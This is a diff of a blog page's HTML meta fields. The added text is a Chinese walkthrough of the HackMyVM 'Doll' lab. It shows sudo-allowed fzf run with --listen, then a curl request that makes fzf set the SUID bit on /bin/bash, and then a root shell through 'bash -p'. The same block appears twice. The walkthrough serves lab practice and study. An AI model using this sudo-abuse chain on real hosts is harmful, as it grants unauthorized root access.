@@ -554,7 +554,44 @@ User bela may run the following commands on doll:
 
 ```
 
-​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。">
+​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。`fzf`​ 支持 `execute`​ 绑定，我们可以通过它来执行任意命令，包括启动 `bash`​ 或 `sh`​ 以获取 root shell。
+
+```
+bela@doll:~$ sudo /usr/bin/fzf --listen=1337
+```
+
+去重新登录一个窗口
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa   
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128
+
+bela@doll:~$ curl -X POST --data '{'call':'execute','args':['chmod u+s /bin/bash']}' http://127.0.0.1:1337
+unknown action: {'call':'execute','args':['/bin/bash']}
+bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337
+
+```
+
+成功拿到root shell
+
+```
+bela@doll:~$ bash -p
+bash-5.1# id
+uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+‍sentence">
 <meta property="og:title" content="hmv_Doll">
 <meta property="og:description" content="# hmv_Doll
 
@@ -1103,7 +1140,44 @@ User bela may run the following commands on doll:
 
 ```
 
-​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。">
+​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。`fzf`​ 支持 `execute`​ 绑定，我们可以通过它来执行任意命令，包括启动 `bash`​ 或 `sh`​ 以获取 root shell。
+
+```
+bela@doll:~$ sudo /usr/bin/fzf --listen=1337
+```
+
+去重新登录一个窗口
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa   
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128
+
+bela@doll:~$ curl -X POST --data '{'call':'execute','args':['chmod u+s /bin/bash']}' http://127.0.0.1:1337
+unknown action: {'call':'execute','args':['/bin/bash']}
+bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337
+
+```
+
+成功拿到root shell
+
+```
+bela@doll:~$ bash -p
+bash-5.1# id
+uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+‍sentence">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Doll.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
